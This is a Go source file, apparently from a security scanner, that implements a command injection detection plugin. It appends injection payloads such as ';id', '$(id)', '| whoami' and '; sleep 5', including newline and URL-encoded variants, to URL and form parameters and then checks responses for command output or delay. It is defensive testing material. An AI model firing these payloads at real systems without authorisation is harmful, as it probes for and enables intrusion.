package plugins

import (
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"time"

	"hackmitm-desktop/internal/activescan"
)

// CommandInjectionPlugin detects OS command injection vulnerabilities
type CommandInjectionPlugin struct {
	*BasePlugin
}

// NewCommandInjectionPlugin creates a new command injection detection plugin
func NewCommandInjectionPlugin() *CommandInjectionPlugin {
	payloads := []string{
		// Basic injection
		";id",
		"|id",
		"&id",
		"&&id",
		"||id",
		"`id`",
		"$(id)",
		// Windows
		"| whoami",
		"& whoami",
		"&& whoami",
		"|| whoami",
		// Unix
		"; whoami",
		"| whoami",
		"& whoami",
		// Time based
		"; sleep 5",
		"| sleep 5",
		"& sleep 5",
		"`sleep 5`",
		"$(sleep 5)",
		// Ping based
		"; ping -c 5 127.0.0.1",
		"| ping -c 5 127.0.0.1",
		"& ping -n 5 127.0.0.1",
		// Echo injection
		"; echo INJECTABLE",
		"| echo INJECTABLE",
		"& echo INJECTABLE",
		"INJECTABLE; echo INJECTABLE",
		// Newline injection
		"\nid",
		"\r\nid",
		"%0aid",
		"%0d%0aid",
		// Encoded
		"%3bid",
		"%7cid",
		"%26id",
	}

	return &CommandInjectionPlugin{
		BasePlugin: NewBasePlugin(
			"COMMAND-INJECTION",
			"Command Injection",
			"Detects OS command injection vulnerabilities",
			activescan.SeverityCritical,
			payloads,
		),
	}
}

// Scan performs command injection testing on the target
func (p *CommandInjectionPlugin) Scan(target *activescan.Target, client *http.Client, config *activescan.ScanConfig) ([]*activescan.Finding, error) {
	var findings []*activescan.Finding

	// Patterns that indicate command execution
	outputPatterns := []string{
		// Unix command outputs
		"uid=",
		"gid=",
		"groups=",
		"root:",
		"/bin/",
		"/usr/",
		"total ",
		"drwx",
		"-rwx",
		"INJECTABLE",
		// Windows command outputs
		"\\windows\\",
		"\\system32\\",
		"domain\\",
		"administrator",
		"volume serial number",
		"directory of",
		// Common outputs
		"127.0.0.1",
		"localhost",
	}

	for _, payload := range p.Payloads() {
		// Test URL parameters
		f := p.testInURL(target, client, config, payload, outputPatterns)
		if f != nil {
			findings = append(findings, f)
		}

		// Test body parameters
		f = p.testInBody(target, client, config, payload, outputPatterns)
		if f != nil {
			findings = append(findings, f)
		}
	}

	// Time-based detection
	timeFindings := p.testTimeBased(target, client, config)
	findings = append(findings, timeFindings...)

	return findings, nil
}

func (p *CommandInjectionPlugin) testInURL(target *activescan.Target, client *http.Client, config *activescan.ScanConfig, payload string, patterns []string) *activescan.Finding {
	parsedURL, err := url.Parse(target.URL)
	if err != nil {
		return nil
	}

	query := parsedURL.Query()
	for param := range query {
		originalValue := query.Get(param)
		query.Set(param, originalValue+payload)
		parsedURL.RawQuery = query.Encode()

		_, body, err := SendRequest(client, target.Method, parsedURL.String(), target.Headers, nil)
		if err != nil {
			query.Set(param, originalValue)
			continue
		}

		if p.isCommandExecuted(body, patterns) {
			request := fmt.Sprintf("%s %s\nPayload: %s -> %s", target.Method, parsedURL.String(), param, payload)
			finding := CreateFinding(p.BasePlugin, target, payload, "Command output detected in response", request, body)
			finding.Confidence = 85
			return finding
		}

		query.Set(param, originalValue)
	}

	return nil
}

func (p *CommandInjectionPlugin) testInBody(target *activescan.Target, client *http.Client, config *activescan.ScanConfig, payload string, patterns []string) *activescan.Finding {
	if target.Method == "GET" || target.Body == "" {
		return nil
	}

	contentType := ""
	for k, v := range target.Headers {
		if strings.ToLower(k) == "content-type" {
			contentType = v
			break
		}
	}

	if strings.Contains(contentType, "application/x-www-form-urlencoded") {
		formData, err := url.ParseQuery(target.Body)
		if err != nil {
			return nil
		}

		for param := range formData {
			originalValue := formData.Get(param)
			formData.Set(param, originalValue+payload)

			_, body, err := SendRequest(client, target.Method, target.URL, target.Headers, []byte(formData.Encode()))
			if err != nil {
				formData.Set(param, originalValue)
				continue
			}

			if p.isCommandExecuted(body, patterns) {
				request := fmt.Sprintf("%s %s\nBody: %s", target.Method, target.URL, formData.Encode())
				finding := CreateFinding(p.BasePlugin, target, payload, "Command output detected in response", request, body)
				finding.Confidence = 85
				return finding
			}

			formData.Set(param, originalValue)
		}
	}

	return nil
}

func (p *CommandInjectionPlugin) testTimeBased(target *activescan.Target, client *http.Client, config *activescan.ScanConfig) []*activescan.Finding {
	var findings []*activescan.Finding

	timePayloads := []struct {
		payload string
		delay   time.Duration
	}{
		{"; sleep 5", 5 * time.Second},
		{"| sleep 5", 5 * time.Second},
		{"& sleep 5", 5 * time.Second},
		{"`sleep 5`", 5 * time.Second},
		{"$(sleep 5)", 5 * time.Second},
	}

	parsedURL, err := url.Parse(target.URL)
	if err != nil {
		return nil
	}

	query := parsedURL.Query()
	for param := range query {
		originalValue := query.Get(param)

		for _, tp := range timePayloads {
			query.Set(param, originalValue+tp.payload)
			parsedURL.RawQuery = query.Encode()

			startTime := time.Now()
			_, _, err := SendRequest(client, target.Method, parsedURL.String(), target.Headers, nil)
			elapsed := time.Since(startTime)

			query.Set(param, originalValue)

			if err != nil {
				continue
			}

			// If response took longer than expected delay
			if elapsed >= tp.delay-500*time.Millisecond {
				request := fmt.Sprintf("%s %s\nPayload: %s -> %s (Response time: %v)", target.Method, parsedURL.String(), param, tp.payload, elapsed)
				finding := CreateFinding(p.BasePlugin, target, tp.payload, fmt.Sprintf("Time-based command injection detected (response time: %v)", elapsed), request, "")
				finding.Severity = activescan.SeverityCritical
				finding.Confidence = 95
				findings = append(findings, finding)
			}
		}
	}

	return findings
}

func (p *CommandInjectionPlugin) isCommandExecuted(body string, patterns []string) bool {
	bodyLower := strings.ToLower(body)

	for _, pattern := range patterns {
		if strings.Contains(bodyLower, strings.ToLower(pattern)) {
			// Avoid false positives from common web content
			if p.isFalsePositive(body, pattern) {
				continue
			}
			return true
		}
	}

	return false
}

func (p *CommandInjectionPlugin) isFalsePositive(body, pattern string) bool {
	// Common false positive patterns
	falsePositiveIndicators := []string{
		"<!doctype html",
		"<html",
		"javascript:",
		"function(",
		"var ",
		"const ",
		"let ",
	}

	bodyLower := strings.ToLower(body)
	for _, indicator := range falsePositiveIndicators {
		if strings.Contains(bodyLower, indicator) {
			// Check if pattern appears in a code/script context
			return true
		}
	}

	return false
}
